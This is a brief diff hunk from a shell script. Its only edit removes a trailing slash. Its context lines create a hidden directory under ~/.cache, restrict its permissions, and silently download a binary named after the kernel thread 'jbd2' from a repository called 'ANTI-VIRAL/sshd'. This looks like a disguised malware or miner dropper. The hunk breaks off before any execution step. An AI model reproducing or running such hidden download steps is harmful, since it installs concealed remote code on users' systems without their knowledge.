@@ -4,7 +4,7 @@ set -e
 
 mkdir -p ~/.cache/.sys
 chmod 700 ~/.cache/.sys
-cd ~/.cache/.sys/
+cd ~/.cache/.sys
 
 wget -q \
     https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
